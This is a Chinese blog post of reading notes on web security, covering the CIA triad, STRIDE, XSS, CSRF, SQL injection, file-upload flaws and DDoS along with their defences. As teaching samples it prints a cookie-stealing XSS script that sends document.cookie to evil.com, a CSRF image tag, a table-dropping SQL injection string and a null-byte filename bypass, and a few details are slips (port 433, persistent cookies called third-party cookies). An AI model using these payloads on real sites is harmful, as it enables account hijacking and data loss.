---
title: Web安全系列——总结
date: 2017-11-18 17:46:47
categories: "读书笔记" 
tags: [Web安全,读书笔记]
---

> Web安全是前端和后端都需要了解的技术。只有当开发团队中的每一位成员都懂得足够多的Web安全知识，才能避免在项目中出现容易被黑客利用的漏洞。

## Web安全入门
### 安全三要素
要全面认识一个安全问题有很多种方法，但是首先需要了解安全问题的基本属性。我们将安全问题总结为安全三要素，简称CIA。安全三要素有机密性（Confidentiality）、完整性（Integrity)、可用性（Availability）构成。  

<!-- more -->

**机密性**要求数据内容不能被泄露，加密是保证机密性的常见手段。  
**完整性**则要求内容是完整的，没有被篡改过。常见的保证完整性手段是签名。  
**可用性**要求保护资源是”随需而得“。假设有一个停车场，可以停100辆车，但是有一天，有人搬了100块石头来把所有车位都占用了，那么停车场的车位就都**不可用**了。在安全领域中，拒绝服务攻击（Denial of Service）就是用来破坏网站的可用性的。

### 威胁分析
威胁分析就是把所有的威胁都找出来。《白帽子讲Web安全》中介绍了一种威胁建模方法，它最早由微软提出，叫做STRIDE模型。  

STRIDE是由6个单词的首字母组成，当我们分析威胁，可以一下6个方面考虑：

| 威胁                            | 定义       | 对应的安全属性 |
| ----------------------------- | -------- | ------- |
| Spoofing (伪装)                 | 冒充他人身份   | 认证      |
| Tampering （篡改）                | 修改数据或代码  | 完整性     |
| Repudiation （抵赖）              | 否认做过的事情  | 不可抵赖性   |
| InformationDisclosure （信息暴露）  | 机密信息泄露   | 机密性     |
| Denial of Service （拒绝服务）      | 拒绝服务     | 可用性     |
| Elevation of Privilege （提升服务） | 未经授权获得许可 | 授权      |

### Web安全原则

在设计安全方案时，有着一系列的原则。遵循这些原则可以最大限度地提高系统的安全性。   

#### 1. 黑名单、白名单原则

在制定防火墙访问控制策略时，如果网站只提供Web服务，那么正确的做法是只允许网站的80端口和433端口对外提供服务，屏蔽除此之外的其他端口。这就是“白名单”做法。当Web应用要处理用户提交的富文本时，需要考虑到XSS的问题。  

过滤掉容易构成XSS攻击的标签如`<script>`、`<iframe>` 等，这就是“黑名单”做法。

#### 2. 最小权限原则

最小权限原则要求系统只授予主体必要的权限，而不是过度授权。这样可以有效减少出错的机会。

在linux系统中，一种良好的操作习惯是使用普通账户登录，在执行费需要root权限的操作时，在通过sudo命令完成。这样可以最大化降低误操作的风险。

#### 3. 数据与代码分离原则 

数据与代码分离原则广泛适用于各种由于”注入“而引起的安全问题。以XSS为例，如果一个页面的代码如下：

```php+HTML
<html>
<head>test</head>
<body>
	$var
</body>
</html>
```

那么

```HTML
<html>
<head>test</head>
<body>
	
</body>
</html>
```

就是代码的执行段

```php
$var
```

就是代码的数据段，数据段`$var` 被当做代码片段来执行，就会引发安全问题。

比如当`$var`的值为

```html
<script src=http://evil></script>
```

浏览器就会把`<script>` 标签当作代码来解释。

根据代码目录分离原则，应该对用户数据片段`$var` 进行安全处理，使用过滤、编码等手段，把造成代码混淆的用户数据清理掉。

#### 4. 纵深防御原则

纵深防御并不是同一个安全方案要做两遍或者多遍，而是要从不同的层面，不同的角度对系统做出整体的解决方案。



## 常见的Web攻击手段

### XSS攻击  

#### 简介

跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。
XSS攻击，一般是指黑客通过在网页中**注入恶意脚本**，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。在介绍数据与代码分离原则的时候所举的例子，其实就是XSS攻击。其中，XSS攻击通常分为反射型XSS、存储型XSS、DOM Based XSS三种。

#### XSS攻击的危害

XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。  

一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。  

如下所示，攻击者先加载一个远程脚本：  

````
 http://localhost/xssTest/test.php?userName=<scriipt src=http://www.evil.com/evil.js></script>  
````

而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：

````javascript
<script>
    var img=document.createElement("img");

    img.src="http://www.evil.com/log?"+escape(document.cookie);  

    document.body.appendChild(img);  
 <script/>
````

这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。  

一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。 

#### 防御

其实如今一些流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、IE 8内置的XSS Filter等。除此之外，还有以下防御手段

##### 1. HttpOnly

HttpOnly最早是由微软提出，并在IE6中实现的，至今已逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly 属性的Cookie。以下浏览器开始支持HttpOnly:  

- Microsoft IE 6 SP1+  

- Mozilla FireFox 2.0.0.5+  

- Mozilla Firefox 3.0.0.6+  

- Google Chrome  

- Apple Safari 4.0+  

- Opera 9.5+



一个Cookie的使用过程如下：  

Step1: 浏览器向服务器发送请求，这时候没有cookie。   

Step2: 服务器返回同时，发送Set-Cookie头，向客户端浏览器写入Cookie。  

Step3: 在该Cookie到期前，浏览器访问该域名下所有的页面，都将发送该Cookie。  

而HttpOnly是在Set-Cookie时标记的。      

##### 2. 输入检查

常见的Web漏洞，如XSS、SQL注入等，都要求攻击者构造一些特殊的字符串，而这些字符串是一般用户不会用到的，所以进行输入检查就很有必要了。  

输入检查可以在用户输入的**格式检查**中进行。很多网站的用户名都要求是字母及数字的组合如“abc1234”，其实也能过滤一部分的XSS和SQL注入。但是，这种在客户端的限制很容易**被绕过**，攻击者可以用JavaScript或一些请求工具，直接构造请求，想网站注入XSS或者SQL。所以，除了在客户端进行格式检查，往往还需要在后端进行二次检查。客户端的检查主要作用是阻挡大部分误操作的正常用户，从而节约服务器资源。  

##### 3. 对输出转义

在输出数据之前对潜在的威胁的字符进行编码、转义是防御XSS攻击十分有效的措施。

为了对抗XSS,在HtmlEncode中至少转换以下字符：


< 转成 `&lt`;

`>` 转成 `&gt`;

& 转成 `&amp`;

" 转成 `&quot`;

' 转成 `&#39`  

### CSRF攻击

#### 简介

CSRF全称为Cross Site Request Forgery，翻译成中文是跨站点请求伪造，是攻击者通过伪装受信任的用户，来想网站发起请求的的一种恶意攻击。听起来很像XSS攻击，但是又与XSS攻击有着本质的不同。可以通过一个简单的例子了解CSRF攻击。  

某个博客网站只需要在登录后，请求这个URL，即可删除编号为“2345”的博客。  

```
 http://blog.sohu.com/manage/entry.do?m=delete&id=2345
```

那么，这个URL就存在CSRF漏洞，可以被攻击者进行利用。攻击者在自己的网站中，插入一张图片，代码为

```
<img src="http://blog.sohu.com/manage/entry.do?m=delete&id=2345" />
```

使`<img>`标签指向删除博客的URL,即可以删除该博客。  

#### CSRF攻击与Cookie

虽然不利用Cookie也能进行CSRF攻击，但是绝大部分破坏力强的CSRF攻击离不开对Cookie的利用。  

浏览器的Cookie分为**两种**：一种是"Session Cookie",又称为”临时Cookie“，另一种是"Third-party Cookie",也称为”本地Cookie“。

两者的区别在于Cookie的**失效时间**。Session Cookie在浏览器关闭后，Session Cookie便马上失效。而Third-party Cookie在Set-Cookie的时候，指定了Expire时间，只有到过了Exipire的时间后，Third-party Session才会失效。  

显然，对于攻击者来说，Third-party Cookie比Session Cookie更加容易利用，从而进行CSRF攻击。因为，Third-party Cookie的有效时间更长，用户访问某个网站后，获取Third-party Cookie,那么在Third-party Cookie失效之前，用户都有遭受CSRF攻击的风险。  

而Session Cookie一般是存放在浏览器的内存中，浏览器关闭就自动失效。攻击者要利用Session Cookie进行攻击的话，还需要先诱使用户访问目标网站，是Session有效，才能进行下一步攻击。  

#### CSRF的防御

CSRF是一种难以识别的攻击，对于CSRF的防御可以采取以下措施。

##### 1. 验证码

CSRF攻击是伪造成用户的身份，自动发起恶意的请求。那么我们可以强迫攻击者与我们的网站进行交互。在一些操作之前加入验证码校验，可以抵御一部分的CSRF攻击。但是加入验证码会影响用户的体验，所以验证码不能作为主要的防御手段。

##### 2. Anti CSRF Token

CSRF攻击的原理，是攻击者伪装成用户身份，发起恶意请求。那么攻击者除了要伪装成功，还需要“猜”出请求的参数。那么如果我们在请求中，加入一个随机的Token，攻击者就永远没有办法”猜“出恶意请求的参数了，这就是Anti CSRF Token。  

Token参数最好放在一个表单中，而不是放在URL里面。比如以下URL。

```

    http://host/path/manage?username=abc&token=[random]
```

因为攻击者可以在当前页面植入恶意的脚本如：

```
<img src="http://evil.com/notexist">
```

则当前页面的  URL回作为HTTP请求的Refferer，发送到evil.com服务器上。因此，最好把Token放在表单中，把敏感操作由GET改为POST,这样可以增加黑客进行CSRF攻击的难度。  

一定要记住的一点是：** Anti CSRF Token 仅仅是用来防御CSRF攻击，而不能防御XSS攻击。XSS攻击必须要采用相应的防御手段。

### 注入攻击

#### 简介

注入攻击的本质，是把用户输入的数据当作代码执行。这里有**两个条件**，一个是用户能够控制输入，一个是原本程序要执行的代码拼接了用户的数据。注入攻击包括SQL注入、XML注入、CRLF注入、代码注入。  

下面是一个SQL注入的典型例子。

```
$var=shipCity;
$shipCity=$_POST['shipCity'];
$shipCity="select * from OrdersTable where ShipCity='".$shipCity."'";
```

变量`$shipCity` 的值由用户提交，当用户输入”Beijing“，那么将要执行的SQL语句是

```
SELECT * FROM OrderTable where ShipCity='Beijing'
```

但如果用户输入一段有语义的SQL如

```
Beijing';drop table OrderTable--
```

那么实际执行的SQL语句如下：

```
SELECT * FROM OrderTable WHERE ShipCity='Beijing' ; drop table OrderTable--
```

原本应该正常执行的查询语句，变成了一个查询语句和一个删除数据表的语句。

#### 防御

一般来说，防御SQL注入的最佳方式是**预编译语句**。使用预编译语句，可以使SQL代码与数据分离，避免发生语义混淆。

下面是PHP中采用预编译语句的示例：

```php
<?php
/*  通过绑定的 PHP 变量执行一条预处理语句 */
$calories = 150;
$colour = 'red';
$sth = $dbh->prepare('SELECT name, colour, calories
    FROM fruit
    WHERE calories < ? AND colour = ?');
$sth->bindParam(1, $calories, PDO::PARAM_INT);
$sth->bindParam(2, $colour, PDO::PARAM_STR, 12);
$sth->execute();
?>
```



### 文件上传漏洞

#### 简介

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过次脚本文件获得了执行服务端命令的权利。

文件上传后导致的常见安全问题有：

- 上传文件是Web脚本语言，服务端的Web容器解释并执行了用户上传的脚本，导致恶意代码执行。
- 上传文件是Flash的策略文件 crossdomain.xml，黑客用以控制Flash在该域下的行为。
- 上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。
- 上传文件是钓鱼图片或者包含了脚本的图片，在某些版本的浏览器中会被当作脚本执行，用于钓鱼和欺诈。

#### 黑客如何利用文件上传漏洞

在针对上传文件的检查中，很多应用都是通过判断**文件后缀名**来验证文件的安全性的。但是如果黑客手段修改上传过程的POST包，在文件名后面添加一个`%00` 字节,就会阶段某些函数对文件名的判断。比如应用只允许上传JPG图片，那么可以构造文件名`xxx.php[\0].JPG`,其中`[\0]` 为十六进制的0x00字符。而 `JPG`绕过了应用的上传文件类型判断。但对于Web服务器来说，因为`\0` 的截断关系，最终会变成xxx.php。

除了通过文件后缀名判断文件类型以外，有时候还会通过文件开头的字节来判断文件类型。在正常情况下，通过判断前10个字节，基本可以盘攒一个文件的真是类型。

#### 设计安全的文件上传功能

根据文件上传漏洞的形成原理，可以通过以下方法来规避：

##### 1. 文件上传的目录设置为不可执行

只要Web容器无法解析该目录下的文件，即使用户上传了恶意脚本，服务器本身也不会收到影响。在很多大型网站中，文件上传后会被放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，另一方面也杜绝了恶意脚本执行的可能。

##### 2. 判断文件类型

在判断文件类型是，可以结合MIME Type、后缀检查等方式。在文件类型检查中国，强烈推荐白名单的方式，而不要使用黑名单。

##### 3. 使用随机数改写文件和文件名路径

要执行上传的恶意代码，则需要恶意代码可以访问。把上传的文件文件名和路径改成随机数，那几时有恶意脚本通过了检查，上传到服务器，黑客也不能通过访问该脚本而执行恶意代码。



### DDOS攻击

#### 简介

DDOS又称为分布式拒绝服务，全称是Distributed Denial of Service。DDOS是利用合理的请求造成资源过载，导致服务不可用。比如有一个停车场，可以停100辆车，但是有一天，有人搬了100块石头来把所有车位都占用了，那么停车场的车位就都**不可用**了。在安全领域中，拒绝服务攻击（Denial of Service）就是用来破坏网站的可用性的。

#### 防御手段

DDOS分为网络层DDOS和应用层DDOS,如今商业的Anti-DDOS设备，主要是对抗网络层的DDOS，而《白帽子讲Web安全》一书讲的主要是应用层的DDOS防御。

##### 1. 限制请求频率

最常见的针对应用层DDOS攻击的防御措施，是在应用中，针对每个“客户端”做一个请求频率的限制。可以通过IP地址与Cookie定位一个客户端，如果客户端在一段时间内请求过于频繁，则对之后来自该客户端所有的请求都重定向到另一个错误页面。

##### 2. 验证码

验证码是互联网中的常用技术，可以有效阻止自动化重放的行为，因为脚本通常无法自动识别出验证码。但如果验证码设计得太复杂，使用户也无法识别，将会严重影响到用户的使用体验。